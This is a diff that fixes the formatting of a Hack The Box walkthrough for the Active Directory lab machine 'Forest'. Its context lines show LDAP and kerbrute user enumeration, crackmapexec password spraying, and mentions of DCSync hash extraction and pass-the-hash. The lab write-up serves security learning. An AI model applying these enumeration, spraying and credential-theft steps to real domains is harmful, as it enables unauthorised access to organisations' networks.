@@ -47,7 +47,6 @@ group: ActiveDirectory
 - **DCSync Attack**: Extracted NTLM hashes of privileged accounts for full domain compromise.
 - **Pass-the-Hash**: Used NTLM hash to authenticate as the `Administrator`.
 
-
 ---
 
 # Reconnaissance
@@ -183,7 +182,7 @@ Let's try `ldapsearch` if there's any user finding.
 
 ```bash
 ┌──(kali㉿kali)-[~/htb]
-└─$ *ldapsearch* -H ldap://10.10.10.161 -x -b "DC=HTB,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
+└─$ ldapsearch -H ldap://10.10.10.161 -x -b "DC=HTB,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
 Guest
 DefaultAccount
 FOREST$
@@ -250,7 +249,7 @@ pwdHistoryLength: 24
 
 Let's double check the usernames with `kerbrute`.
 
-```swift
+```bash
 ┌──(kali㉿kali)-[~/htb]
 └─$ kerbrute_linux_arm64 userenum --domain htb.local /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.10.161 
 
@@ -281,7 +280,7 @@ Version: dev (9cfb81e) - 12/02/24 - Ronnie Flathers @ropnop
 
 `administrator`, `forest` need to be added. But other than that, there's no other newly found users.
 
-```swift
+```bash
 ┌──(kali㉿kali)-[~/htb]
 └─$ kerbrute_linux_arm64 userenum --dc 10.10.10.161 -d htb.local usernames.txt 
 
@@ -326,7 +325,7 @@ Impacket v0.12.0.dev1 - Copyright 2023 Fortra
 
 Let's try password-spraying with `usernames.txt`
 
-```scss
+```bash
 ┌──(kali㉿kali)-[~/htb]
 └─$ crackmapexec smb 10.10.10.161 -u usernames.txt -p usernames.txt 
 [*] First time use detected
